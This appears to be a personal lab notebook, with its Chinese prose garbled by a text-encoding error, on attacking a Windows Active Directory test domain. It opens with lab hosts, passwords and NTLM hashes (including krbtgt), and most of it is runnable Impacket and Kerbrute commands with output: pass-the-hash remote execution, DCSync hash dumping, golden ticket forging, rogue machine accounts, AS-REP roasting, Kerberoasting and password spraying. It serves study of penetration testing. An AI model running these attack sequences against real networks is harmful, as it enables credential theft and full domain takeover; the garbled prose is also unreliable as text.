ç¯å¢ƒ

```
åŸŸæ§ï¼š
owa2010cn-god.god.org
windows2008
192.168.10.16 192.168.3.33
administrator/Admin123456        AAD3B435B51404EEAAD3B435B51404EE:ccef208c6485269c20db2cad21734fe7 

åŸŸå†…æˆå‘˜ä¸»æœºï¼š
webserver.god.org
windows2008
192.168.10.15  192.168.3.31
administrator/admin!@#45       AAD3B435B51404EEAAD3B435B51404EE:518b98ad4178a53695dc997aa02d455c
god\dbadmin/admin!@#45 

krbtgt aad3b435b51404eeaad3b435b51404ee:b097d7ed97495408e1537f706c357fc5
```

åšç¬”è®°æ—¶ï¼Œé¢å¯¹ä¹¦é‡Œå¤§é‡çš„å†…å®¹ï¼Œæˆ‘å¾—å…ˆè¯†åˆ«å“ªäº›éƒ¨åˆ†æ˜¯å¯¹æˆ‘æ¯”è¾ƒé‡è¦çš„ï¼Œç„¶åç²¾å­¦ã€‚æ¯ä¸ªç« èŠ‚ï¼Œç”¨è‡ªå·±çš„è¯æˆ–è€…æç‚¼ç®€è¦æ–‡å­—æ¦‚æ‹¬ï¼ˆè‡ªå·±èƒ½è¿…é€Ÿæ˜ç™½ï¼‰ï¼Œæ‰‹æ“å®éªŒä¹Ÿé‡è¦ï¼Œä¸è¦çº¸ä¸Šè°ˆå…µã€‚



# åŸŸå†…å·¥å…·çš„ä½¿ç”¨

## BloodHound

[BloodHoundAD Â· GitHub](https://github.com/BloodHoundAD/)



## Adfind

github é‡Œæ²¡æ‰¾åˆ°

è¿™é‡Œç®€è¿°ä¸‹å®ƒçš„æŸ¥è¯¢ç¤ºä¾‹ï¼š

- æŸ¥è¯¢åŸŸä¿¡ä»»å…³ç³»
- æŸ¥è¯¢åŸŸæ§
- æœºå™¨ç›¸å…³çš„æŸ¥è¯¢
- ç”¨æˆ·ç›¸å…³çš„æŸ¥è¯¢
- ç»„ç›¸å…³æŸ¥è¯¢
- å§”æ´¾ç›¸å…³æŸ¥è¯¢
- å…¶å®ƒ



## Admod

æ´»åŠ¨ç›®å½•ä¿®æ”¹å·¥å…·



ä¿®æ”¹ç¤ºä¾‹ï¼š

- åˆ›å»ºç”¨æˆ·
- åˆ›å»ºOU
- å°†ç”¨æˆ·ç§»åŠ¨åˆ°æŒ‡å®šOU
- åˆ é™¤ç”¨æˆ·
- é‡ç½®ç”¨æˆ·å¯†ç 
- ä¿®æ”¹ç”¨æˆ·å¯†ç 
- ä¿®æ”¹åŸŸçš„ MAQ ä¸º 0



## LAP

å¾®è½¯è‡ªå¸¦çš„æ´»åŠ¨ç›®å½•æŸ¥è¯¢å·¥å…·



## Ldapsearch

æ´»åŠ¨ç›®å½•æŸ¥è¯¢å·¥å…·

è¿™é‡Œç®€è¿°ä¸‹å®ƒçš„æŸ¥è¯¢ç¤ºä¾‹ï¼š

- æŸ¥è¯¢åŸŸä¿¡ä»»å…³ç³»
- æŸ¥è¯¢åŸŸæ§
- æœºå™¨ç›¸å…³çš„æŸ¥è¯¢
- ç”¨æˆ·ç›¸å…³çš„æŸ¥è¯¢
- ç»„ç›¸å…³æŸ¥è¯¢
- å§”æ´¾ç›¸å…³æŸ¥è¯¢
- å…¶å®ƒ



## PingCastle

åŸŸå†…å®‰å…¨æ£€æµ‹å·¥å…·

[Home - PingCastle](https://www.pingcastle.com/)



## Kekeo

é’ˆå¯¹ Kerberos åè®®è¿›è¡Œæ”»å‡»çš„å·¥å…·

ä½œç”¨å¯ï¼š

- ç”³è¯· TGT
- ç”³è¯· ST
- çº¦æŸæ€§å§”æ´¾æ”»å‡»



## Rubeus

Kekeo çš„ å‡çº§ç‰ˆ

[GitHub - GhostPack/Rubeus: Trying to tame the three-headed dog.](https://github.com/GhostPack/Rubeus)

ä½œç”¨å¾ˆå¤§ï¼š

- ç”³è¯· TGT
- ç”³è¯· ST
- å¯¼å…¥ç¥¨æ®
- AS-REP Roasting æ”»å‡»
- Kerberoasting æ”»å‡»
- å§”æ´¾æ”»å‡»



## Mimikatz

å¯ä»¥ä»æœºå™¨å†…å­˜ä¸­æå–å¯†ç ã€å¯†ç hashã€PINç ã€Kerberos ç¥¨æ®ç­‰

ç®€è¿°ä¸‹å®ƒçš„æ¨¡å—ï¼š

- privilege
- sekurlsa
- kerberos
- lsadump
- sid



## Impacket

```bash
export PATH=/usr/share/doc/python3-impacket/examples:$PATH
```

python å¤„ç†ç½‘ç»œåè®®çš„é›†åˆ



### psexec.py

æ¡ä»¶ï¼šç›®æ ‡ä¸»æœºå¼€å¯ 445 ç«¯å£ã€IPS$ å’Œé $IPC çš„å¯å†™å…±äº«

å·¥ä½œç»„ï¼š

```bash
â””â”€# psexec.py administrator:Admin12345@192.168.10.16
â””â”€# psexec.py administrator@192.168.10.16 -hashes AAD3B435B51404EEAAD3B435B51404EE:ccef208c6485269c20db2cad21734fe7
```

åŸŸï¼š

```bash
â””â”€# psexec.py god/webadmin:admin\!\@\#45@192.168.10.15                                                                                                  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.10.15.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
```

```bash
â””â”€# psexec.py god/webadmin@192.168.10.15 -hashes AAD3B435B51404EEAAD3B435B51404EE:518b98ad4178a53695dc997aa02d455c
```



### smbexec.py

æ¡ä»¶ï¼š

ç›®æ ‡ä¸»æœºå¼€å¯ 445 ç«¯å£ã€IPS$ å’Œé $IPC çš„å¯å†™å…±äº«ï¼Œå¯ä»¥ä½¿ç”¨é™¤ ipc$ å…±äº«å¤–çš„å…¶å®ƒå…±äº«ã€‚å¯ä»¥ -share å‚æ•°æŒ‡å®šå…¶å®ƒå…±äº«

å·¥ä½œç»„ï¼š

```bash
â””â”€# smbexec.py administrator:Admin12345@192.168.10.16 -codec gbk
â””â”€# smbexec.py administrator@192.168.10.16 -hashes AAD3B435B51404EEAAD3B435B51404EE:ccef208c6485269c20db2cad21734fe7 -codec gbk
```

 åŸŸï¼š

```bash
â””â”€# smbexec.py god/webadmin@192.168.10.15 -hashes AAD3B435B51404EEAAD3B435B51404EE:518b98ad4178a53695dc997aa02d455c

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
```

```bash
â””â”€# smbexec.py god/administrator@192.168.10.16 -hashes AAD3B435B51404EEAAD3B435B51404EE:ccef208c6485269c20db2cad21734fe7 -codec gbk   
```



### wmiexec.py

æ¡ä»¶ï¼š

å¼€å¯ 135 ç«¯å£ å’Œ 445 ç«¯å£ï¼Œå¹¶ä¾èµ–äº admin$

å·¥ä½œç»„ï¼š

```bash
â””â”€# wmiexec.py administrator:Admin12345@192.168.10.16 -codec gbk
â””â”€# wmiexec.py administrator@192.168.10.16 -hashes AAD3B435B51404EEAAD3B435B51404EE:ccef208c6485269c20db2cad21734fe7 -codec gbk
```

åŸŸï¼š

```bash
â””â”€# wmiexec.py god/webadmin@192.168.10.15 -hashes AAD3B435B51404EEAAD3B435B51404EE:518b98ad4178a53695dc997aa02d455c

[*] SMBv2.1 dialect used
[-] rpc_s_access_denied
```

```bash
â””â”€# wmiexec.py god/administrator@192.168.10.16 -hashes AAD3B435B51404EEAAD3B435B51404EE:ccef208c6485269c20db2cad21734fe7 -codec gbk   
```



### atexec.py

é€šè¿‡è®¡åˆ’ä»»åŠ¡æ‰§è¡Œå‘½ä»¤

å·¥ä½œç»„ï¼š

```bash
â””â”€# atexec.py administrator:Admin12345@192.168.10.16 whoami
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[!] This will work ONLY on Windows >= Vista
[*] Creating task \gSkPbcWs
[*] Running task \gSkPbcWs
[*] Deleting task \gSkPbcWs
[*] Attempting to read ADMIN$\Temp\gSkPbcWs.tmp
[*] Attempting to read ADMIN$\Temp\gSkPbcWs.tmp
nt authority\system
```

```bash
â””â”€# wmiexec.py administrator@192.168.10.16 whoami -hashes AAD3B435B51404EEAAD3B435B51404EE:ccef208c6485269c20db2cad21734fe7
```

åŸŸï¼š

```bash
â””â”€# atexec.py god/webadmin@192.168.10.15  whoami -hashes AAD3B435B51404EEAAD3B435B51404EE:518b98ad4178a53695dc997aa02d455c                                    2 â¨¯
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[!] This will work ONLY on Windows >= Vista
[*] Creating task \tQNtxEPh
[-] rpc_s_access_denied
```

```bash
â””â”€# wmiexec.py god/administrator@192.168.10.16 whoami -hashes AAD3B435B51404EEAAD3B435B51404EE:ccef208c6485269c20db2cad21734fe7
```



### dcomexec.py

è„šæœ¬é€šè¿‡ DCOM åœ¨æ¨¡ç‰ˆæœºä¸Šå‘½ä»¤æ‰§è¡Œ



```bash
â””â”€# dcomexec.py administrator:Admin12345@192.168.10.16 whoami
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv2.1 dialect used
god\administrator 
```

```bash
â””â”€# dcomexec.py webadmin:admin\!\@\#45@192.168.10.15 whoami                                                                                                   1 â¨¯
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
```



```bash
â””â”€# dcomexec.py administrator@192.168.10.16 whoami -hashes AAD3B435B51404EEAAD3B435B51404EE:ccef208c6485269c20db2cad21734fe7
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv2.1 dialect used
god\administrator
```



### smbclient.py

å¯å‘æœåŠ¡å™¨ä¸Šä¼ æ–‡ä»¶

è¿æ¥æˆåŠŸåçš„å‘½ä»¤ï¼š

```bash
info #æŸ¥çœ‹ä¿¡æ¯
shares #æŸ¥çœ‹å¼€å¯çš„å…±äº«
use xxx #ä½¿ç”¨æŒ‡å®šå…±äº«
ls
cd
put xxx #ä¸Šä¼ æ–‡ä»¶
get xxx  #ä¸‹è½½æ–‡ä»¶
```



å·¥ä½œç»„ç¯å¢ƒï¼š

```bash
â””â”€# smbclient.py administrator:Admin12345@192.168.10.16
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Type help for list of commands
# info
Version Major: 6
Version Minor: 1
Server Name: OWA2010CN-GOD
Server Comment: 
Server UserPath: c:\
Simultaneous Users: 16777216
# shares
Address
ADMIN$
C$
ExchangeOAB
GroupMetrics
IPC$
NETLOGON
SYSVOL
WMI_SHARE
# exit 
```

```bash
â””â”€# smbclient.py administrator@192.168.10.16 -hashes AAD3B435B51404EEAAD3B435B51404EE:ccef208c6485269c20db2cad21734fe7
```



åŸŸç¯å¢ƒï¼š

```bash
â””â”€# smbclient.py god/administrator@192.168.10.16 -hashes AAD3B435B51404EEAAD3B435B51404EE:ccef208c6485269c20db2cad21734fe7
```

```bash
â””â”€# smbclient.py god/administrator:Admin12345@192.168.10.16
```



### secretsdump.py

æ ¹æ® DCSync åŠŸèƒ½å¯¼å‡º åŸŸå†…ç”¨æˆ·çš„ hashï¼Œéœ€è¦è¿æ¥çš„è´¦æˆ·å’Œå¯†ç å…·æœ‰ DCSync æƒé™



è·å–åŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„ Hash

```bash
secretsdump.py god/administrator:Admin12345@192.168.10.16 -just-dc
secretsdump.py god/webadmin:admin\!\@\#45@192.168.10.15 -just-dc  å¤±è´¥
```

ä½¿ç”¨å·å½±å¤åˆ¶å¯¼å‡ºåŸŸå†…æ‰€æœ‰ Hash

```bash
secretsdump.py god/administrator:Admin12345@192.168.10.16 -use-vss
```

è·å–åŸŸå†…æŒ‡å®šç”¨æˆ· krbtgt ç”¨æˆ·çš„ Hash

```bash
secretsdump.py god/administrator:Admin12345@192.168.10.16 -just-dc-user krbtgt
```

å¦‚æœå½“å‰å¯¼å…¥äº†ç®¡ç†å‘˜ç¥¨æ®ï¼Œåˆ™ä¸éœ€è¦å¯†ç å³å¯å¯¼å‡º Hash

```bash
secretsdump.py -k -no-pass owa2010cn-god.god.org -just-dc-user administrator
```

å¦‚æœæ˜¯åŸŸæ—ï¼Œåˆ™åœ¨æŒ‡å®šç”¨æˆ·éœ€è¦åŠ ä¸Š åŸŸå‰ç¼€

```bash
secretsdump.py xie/administrator:P@ssword1234@10.211.55.4 -just-dc-user "xie\krbtgt"
```



### ticketer.py

ç”Ÿæˆé»„é‡‘ç¥¨æ®

- åŸŸçš„ SID

  ```
  wmic useraccount get name,sid
  ```

  `S-1-5-21-1218902331-2157346161-1782232778`

- krbtgt Hash

  ```
  aad3b435b51404eeaad3b435b51404ee:b097d7ed97495408e1537f706c357fc5
  ```

  

1ã€ç”Ÿæˆé»„é‡‘ç¥¨æ®

è®°å¾—å…ˆç»‘å®š hosts `echo "192.168.10.16 god.org" >> /etc/hosts`

```bash
ticketer.py -domain-sid  S-1-5-21-1218902331-2157346161-1782232778 -nthash b097d7ed97495408e1537f706c357fc5 -domain god.org administrator
```

2ã€å¯¼å…¥ç¥¨æ®

```bash
export KRB5CCNAME=administrator.ccache
```

3ã€æ— éœ€å¯†ç å¯¼å‡º åŸŸå†… Hash

```bash
secretsdump.py -k -no-pass administrator@owa2010cn-god.god.org -dc-ip 192.168.10.16
```

<img src=".\å›¾ç‰‡\Snipaste_2023-09-19_16-21-26.png" alt="Snipaste_2023-09-19_16-21-26" style="zoom:67%;" />



æ¸…é™¤ç¥¨æ®çš„è¯ï¼Œæˆ‘æ²¡æ‰¾åˆ°å‘½ä»¤ï¼Œä½†æ˜¯å¯ä»¥ éšæ„æ–°å»ºä¸€ä¸ª no.ccache æ–‡ä»¶

```
export KRB5CCNAME=no.ccache  å°±ç®—æ¸…é™¤äº†ä¹‹å‰å¯¼å…¥çš„ administrator.ccache
```

æˆ‘çœŸæ˜¯å°å¤©æ‰



### getTGT.py

è¯·æ±‚ TGT

```bash
â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# getTGT.py god/administrator@192.168.2.9 -dc-ip=192.168.2.9           
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:  Admin12345
[*] Saving ticket in administrator@192.168.2.9.ccache
```



### getST.py

è¯·æ±‚ ST

```bash
#æä¾›è´¦å·å¯†ç è¯·æ±‚æŒ‡å®šçš„ SPN æœåŠ¡ç¥¨æ®
getST.py -dc-ip 10.211.55.4 -spn cifs/ad01.xie.com xie.com/administrator:P@ssword1234
#å¯¼å…¥ç¥¨æ®
export KRB5CCNAME=administrator.ccache
#è®¿é—®è¯¥æœåŠ¡
smbexec.py -np-pass -k ad01.xie.com

#ä½¿ç”¨ TGT ç”Ÿæˆ ST ç¥¨æ®è¿‡ç¨‹å¦‚ä¸‹
#å¯¼å…¥ä¸Šä¸€æ­¥è¯·æ±‚ TGT ç”Ÿæˆçš„ç¥¨æ®
export=administrator@10.211.55.4.ccache
#è¯·æ±‚æŒ‡å®š SPN çš„ ST
getST.py -dc-ip 10.211.55.4 -k -no-pass -spn cifs/ad01.xie.com xie.com/administrator:P@ssword1234
#å¯¼å…¥ç¥¨æ®
export=administrator@10.211.55.4.ccache
#è®¿é—®è¯¥æœåŠ¡
smbexec.py -np-pass -k ad01.xie.com
```



### lookupsid.py

å¦‚æœå¾—åˆ°ä»»æ„åŸŸå†…çš„ä¸€ç»„è´¦å·å¯†ç ï¼Œåˆ™å¯ä»¥åˆ©ç”¨æ¬¡è„šæœ¬å¾—åˆ°è¯¥åŸŸçš„ SID å€¼

```bash
â””â”€# lookupsid.py god/webadmin:admin\!\@\#45@192.168.2.15 -domain-sids    æ˜¯ webserver
â””â”€# lookupsid.py god/webadmin:admin\!\@\#45@192.168.2.9 -domain-sids   æ˜¯ owa2010cn
```

```
[*] Brute forcing SIDs at 192.168.2.15
[*] StringBinding ncacn_np:192.168.2.15[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1218902331-2157346161-1782232778
498: GOD\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: GOD\Administrator (SidTypeUser)
501: GOD\Guest (SidTypeUser)
502: GOD\krbtgt (SidTypeUser)
512: GOD\Domain Admins (SidTypeGroup)
513: GOD\Domain Users (SidTypeGroup)
514: GOD\Domain Guests (SidTypeGroup)
515: GOD\Domain Computers (SidTypeGroup)
516: GOD\Domain Controllers (SidTypeGroup)
517: GOD\Cert Publishers (SidTypeAlias)
518: GOD\Schema Admins (SidTypeGroup)
519: GOD\Enterprise Admins (SidTypeGroup)
520: GOD\Group Policy Creator Owners (SidTypeGroup)
521: GOD\Read-only Domain Controllers (SidTypeGroup)
553: GOD\RAS and IAS Servers (SidTypeAlias)
571: GOD\Allowed RODC Password Replication Group (SidTypeAlias)
572: GOD\Denied RODC Password Replication Group (SidTypeAlias)
1000: GOD\OWA2010CN-GOD$ (SidTypeUser)
1101: GOD\DnsAdmins (SidTypeAlias)
1102: GOD\DnsUpdateProxy (SidTypeGroup)
1103: GOD\Organization Management (SidTypeGroup)
1104: GOD\Public Folder Management (SidTypeGroup)
1105: GOD\Recipient Management (SidTypeGroup)
1106: GOD\View-Only Organization Management (SidTypeGroup)
1107: GOD\UM Management (SidTypeGroup)
1108: GOD\Help Desk (SidTypeGroup)
1109: GOD\Records Management (SidTypeGroup)
1110: GOD\Discovery Management (SidTypeGroup)
1111: GOD\Server Management (SidTypeGroup)
1112: GOD\Delegated Setup (SidTypeGroup)
1113: GOD\Hygiene Management (SidTypeGroup)
1114: GOD\Exchange Servers (SidTypeGroup)
1115: GOD\Exchange Trusted Subsystem (SidTypeGroup)
1116: GOD\Exchange Windows Permissions (SidTypeGroup)
1117: GOD\Exchange All Hosted Organizations (SidTypeGroup)
1118: GOD\ExchangeLegacyInterop (SidTypeGroup)
1119: GOD\SM_6ef9b5ce414946ae9 (SidTypeUser)
1120: GOD\SM_d80bb46e75164f258 (SidTypeUser)
1121: GOD\SM_d3853544b62a421fb (SidTypeUser)
1122: GOD\SM_c330a5709f6a478b8 (SidTypeUser)
1123: GOD\$331000-U3VF1DKMCN71 (SidTypeGroup)
1124: GOD\mary (SidTypeUser)
1126: GOD\jenkins (SidTypeUser)
1127: GOD\mack (SidTypeUser)
1128: GOD\hr (SidTypeUser)
1129: GOD\boss (SidTypeUser)
1130: GOD\dbadmin (SidTypeUser)
1131: GOD\vpnadm (SidTypeUser)
1132: GOD\webadmin (SidTypeUser)
1133: GOD\MARY-PC$ (SidTypeUser)
1134: GOD\JACK-PC$ (SidTypeUser)
1135: GOD\fileadmin (SidTypeUser)
1136: GOD\WEBSERVER$ (SidTypeUser)
1137: GOD\FILESERV$ (SidTypeUser)
1138: GOD\SQLSERVER$ (SidTypeUser)
1139: GOD\fedora (SidTypeUser)
1140: GOD\kali (SidTypeUser)
1141: GOD\debian (SidTypeUser)
1142: GOD\itadmin (SidTypeUser)
1143: GOD\devadmain (SidTypeUser)
1144: GOD\logers (SidTypeUser)
1145: GOD\logtest (SidTypeUser)
1146: GOD\klion (SidTypeUser)
1147: GOD\klionsec (SidTypeUser)
1148: GOD\dadd (SidTypeUser)
1149: GOD\SAMTHEADMIN-68$ (SidTypeUser)
1150: GOD\SAMTHEADMIN-61$ (SidTypeUser)
```



### addcomputer.py

å¢åŠ æœºå™¨è´¦æˆ·

åœ¨åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾æ”»å‡»ä¸­ï¼Œæˆ‘ä»¬å¾€å¾€éœ€è¦æ§åˆ¶ä¸€ä¸ªæœºå™¨è´¦æˆ·



SARM åè®®è¿œç¨‹åˆ›å»ºæœºå™¨è´¦æˆ·ä¸º machine1$ ï¼Œå¯†ç ä¸º rootã€‚é»˜è®¤æ—  SPN

```bash
addcomputer.py -computer-name 'machine1$' -computer-pass 'root' -dc-ip 192.168.2.9 'god.org/webadmin:admin!@#45' -method SAMR -debug
```



LDAP åè®®è¿œç¨‹åˆ›å»ºæœºå™¨è´¦æˆ·ä¸º machine2$ ï¼Œå¯†ç ä¸º rootã€‚é»˜è®¤æœ‰ SPN

```bash
addcomputer.py -computer-name 'machine2$' -computer-pass 'root' -dc-ip 192.168.2.9 'god.org/webadmin:admin!@#45' -method LDAPS -debug
```



ä¿®æ”¹å·²ç»åˆ›å»ºæœºå™¨è´¦æˆ·çš„å¯†ç ï¼Œå°† machine1$ å¯†ç ä¿®æ”¹ä¸º roots

```bash
addcomputer.py -computer-name 'machine1$' -computer-pass 'roots' -dc-ip 192.168.2.9 'god.org/webadmin:admin!@#45' -method SAMR -debug -no-add
```



### GetNPUsers.py

**AS-REP Roasting** æ”»å‡»

æŸ¥æ‰¾ä¸éœ€è¦è¿›è¡ŒåŸŸèº«ä»½éªŒè¯çš„ç”¨æˆ·ï¼Œå¹¶è·å– è¯¥è´¦æˆ· Hash åŠ å¯†çš„ Login Session Key 

å…ˆæ•´ç†ä¸€ä»½å­—å…¸ `user.list`

```
Administrator            
boss                     
dadd                     
dbadmin                  
debian                   
devadmain                
fedora                   
fileadmin                
Guest                    
hr                       
itadmin                  
jenkins                  
kali                     
klion                    
klionsec                 
krbtgt                   
logers                   
logtest                  
mack                     
mary                       
vpnadm                   
webadmin  
```



```
GetNPUsers.py -dc-ip 192.168.2.9 -usersfile user.list format john god.org/
```



### GetUserSPNs.py

`kerberoasting` æ”»å‡»



æŸ¥æ‰¾æ‰€åœ¨åŸŸæ³¨å†Œåœ¨ç”¨æˆ·ä¸‹çš„ SPNï¼š

```bash
GetUserSPNs.py -dc-ip 192.168.2.9 god.org/webadmin:admin\!\@\#45
```

```
ServicePrincipalName  Name      MemberOf  PasswordLastSet             LastLogon                   Delegation  
--------------------  --------  --------  --------------------------  --------------------------  -----------
priv/test             webadmin            2019-04-14 05:29:33.303878  2023-09-19 08:18:06.468714  constrained 
```



è¯·æ±‚æ³¨å†Œäºç”¨æˆ·ä¸‹æ‰€æœ‰ SPN çš„ ST ï¼Œå¹¶ä»¥ hashcat èƒ½ç ´è§£çš„æ ¼å¼ä¿å­˜ä¸º hash.txt

```bash
GetUserSPNs.py -request -dc-ip 192.168.2.9 god.org/webadmin:admin\!\@\#45 -outputfile hash.txt
```



è¯·æ±‚æ³¨å†Œåœ¨æŒ‡å®šç”¨æˆ·ä¸‹çš„ SPN çš„ STï¼Œå¹¶ä»¥ hashcat èƒ½ç ´è§£çš„æ ¼å¼ä¿å­˜ä¸º hash.txt

```bash
GetUserSPNs.py -request -dc-ip 192.168.2.9 god.org/webadmin:admin\!\@\#45 -outputfile hash.txt -request-user webadmin
```



### ticketConverter.py

å¯å°† .ccache å’Œ .kirbi ä¸¤ç§æ ¼å¼çš„ç¥¨æ®è¿›è¡Œè½¬æ¢

```bash
ticketConverter.py administrator.ccache administrator.kirbi
ticketConverter.py  administrator.kirbi administrator.ccache
```



### addspn.py

å¯æŸ¥è¯¢ã€å¢åŠ ã€åˆ é™¤ SPNï¼Œå¢åŠ éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œåˆ é™¤åˆ™åªéœ€è¦å¯¹ç›®æ ‡å±æ€§å…·æœ‰ä¿®æ”¹çš„æƒé™

[krbrelayx/README.md at master Â· dirkjanm/krbrelayx Â· GitHub](https://github.com/dirkjanm/krbrelayx/blob/master/README.md)

```
usage: addspn.py [-h] [-u USERNAME] [-p PASSWORD] [-t TARGET] -s SPN [-r] [-q]
                 [-a]
                 HOSTNAME

Add an SPN to a user/computer account

Required options:
  HOSTNAME              Hostname/ip or ldap://host:port connection string to
                        connect to

Main options:
  -h, --help            show this help message and exit
  -u USERNAME, --user USERNAME
                        DOMAIN\username for authentication
  -p PASSWORD, --password PASSWORD
                        Password or LM:NTLM hash, will prompt if not specified
  -t TARGET, --target TARGET
                        Computername or username to target (FQDN or COMPUTER$
                        name, if unspecified user with -u is target)
  -s SPN, --spn SPN     servicePrincipalName to add (for example:
                        http/host.domain.local or cifs/host.domain.local)
  -r, --remove          Remove the SPN instead of add it
  -q, --query           Show the current target SPNs instead of modifying
                        anything
  -a, --additional      Add the SPN via the msDS-AdditionalDnsHostName
                        attribute
```



# åŸŸå†…æ¸—é€æ‰‹æ³•

## åŸŸå†…ç”¨æˆ·åæšä¸¾

Kerberos åœ¨åè®®è®¤è¯ çš„ AS-REQ é˜¶æ®µï¼Œè¯·æ±‚åŒ…çš„ cname å€¼æ˜¯ç”¨æˆ·åã€‚å½“ç”¨æˆ·çŠ¶æ€ä¸º å­˜åœ¨å¯åŠ¨ ã€å­˜åœ¨ä½†ç¦ç”¨ ã€ ä¸å­˜åœ¨ æ—¶ï¼Œè¿”å›çš„ AS-REP åŒ…å„ä¸ç›¸åŒï¼Œæ‰€ä»¥å­˜åœ¨ç”¨æˆ·åæšä¸¾ã€‚

### å·¥å…·ä½¿ç”¨

1ã€Kerbrute å·¥å…·

```bash
â””â”€# ./Desktop/kerbrute_linux_amd64 userenum --dc 192.168.2.15 -d god.org user.list

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/20/23 - Ronnie Flathers @ropnop

2023/09/20 08:05:52 >  Using KDC(s):
2023/09/20 08:05:52 >  	192.168.2.15:88

2023/09/20 08:05:52 >  [+] VALID USERNAME:	 administrator@god.org
2023/09/20 08:05:52 >  [+] VALID USERNAME:	 webadmin@god.org
2023/09/20 08:05:52 >  Done! Tested 3 usernames (2 valid) in 0.003 seconds
```

2ã€msf

```bash
msf6 > use auxiliary/gather/kerberos_enumusers 
msf6 auxiliary(gather/kerberos_enumusers) > set domain god.org
domain => god.org
msf6 auxiliary(gather/kerberos_enumusers) > set rhosts 192.168.2.15
rhosts => 192.168.2.15
msf6 auxiliary(gather/kerberos_enumusers) > set user_file user.list
user_file => user.list
msf6 auxiliary(gather/kerberos_enumusers) > run

[*] Using domain: GOD.ORG - 192.168.2.15:88      ...
[+] 192.168.2.15 - User: "administrator" is present
[!] No active DB -- Credential data will not be saved!
[+] 192.168.2.15 - User: "webadmin" is present
[*] 192.168.2.15 - User: "xxxxxxxxxxx" user not found
[*] Auxiliary module execution completed
```

3ã€pyKerbrute

[pyKerbrute](https://github.com/3gstudent/pyKerbrute)



è¡¥å……ä¸€ä¸‹ï¼Œ å¦‚ä¸‹å‘½ä»¤å¯ä»¥æŸ¥çœ‹å¯†ç ç­–ç•¥

```bash
â””â”€# crackmapexec  smb --pass-pol 192.168.2.15
```



### æŠ“åŒ…åˆ†æ

Adminisreator ç”¨æˆ·å­˜åœ¨åŒ… ï¼ŒAS-REQ é‡Œå­˜åœ¨ ç”¨æˆ·åå­—æ®µ

<img src=".\å›¾ç‰‡\Snipaste_2023-09-20_20-14-34.png" alt="Snipaste_2023-09-20_20-14-34" style="zoom:67%;" />



ä¸å­˜åœ¨ç”¨æˆ·çš„å“åº”åŒ… AS-REP ï¼Œè¿”å›ä¿¡æ¯ä¸å­˜åœ¨ç”¨æˆ·çš„å“åº”åŒ… ä¸ä¸€æ ·

<img src=".\å›¾ç‰‡\Snipaste_2023-09-20_20-21-14.png" alt="Snipaste_2023-09-20_20-21-14" style="zoom:67%;" />



## å¯†ç å–·æ´’

è¿˜æ˜¯åœ¨ AS-REQ é˜¶æ®µï¼Œå½“ç”¨æˆ·åå­˜åœ¨æ—¶ï¼Œæ­£ç¡®æˆ–è€…é”™è¯¯çš„å¯†ç ä¸¤ç§æƒ…å†µä¸‹ï¼Œ AS-REP è¿”å›åŒ…å„ä¸ç›¸åŒï¼Œå¯ä»¥ç”¨è¿™ä¸ªç‰¹æ€§æšä¸¾å¯†ç ã€‚

é€šå¸¸æƒ…å†µä¸‹å¯ä»¥å·²çŸ¥ç”¨æˆ·åå»æšä¸¾å¯†ç ï¼Œä¹Ÿå¯ä»¥å·²çŸ¥å¯†ç å»æšä¸¾ç”¨æˆ·åï¼Œä¹Ÿå¯ä»¥ç”¨æˆ·åå’Œå¯†ç ä¸€èµ·æšä¸¾ã€‚ä½†æ˜¯ç›®æ ‡åŸŸå¯èƒ½è®¾ç½®äº†é”å®šç­–ç•¥ï¼Œæ¯”å¦‚åŒä¸€ä¸ªç”¨æˆ·è¿ç»­è¾“é”™å¯†ç æ—¶ç”¨æˆ·ä¼šè¢«é”å®šã€‚

### å·¥å…·

1ã€Kerbrute

```bash
â””â”€# ./Desktop/kerbrute_linux_amd64 passwordspray --dc 192.168.2.15 -d god.org user.list Admin12345

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/20/23 - Ronnie Flathers @ropnop

2023/09/20 08:36:04 >  Using KDC(s):
2023/09/20 08:36:04 >  	192.168.2.15:88

2023/09/20 08:36:04 >  [+] VALID LOGIN:	 administrator@god.org:Admin12345
```

```bash
â””â”€# ./Desktop/kerbrute_linux_amd64 passwordspray --dc 192.168.2.15 -d god.org user.list admin\!\@\#45                                                         1 â¨¯

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/20/23 - Ronnie Flathers @ropnop

2023/09/20 08:36:37 >  Using KDC(s):
2023/09/20 08:36:37 >  	192.168.2.15:88

2023/09/20 08:36:37 >  [+] VALID LOGIN:	 webadmin@god.org:admin!@#45
```

2ã€crackmapexecï¼Œè¿™ä¸ªæ˜¯ smb çš„è®¤è¯

```bash
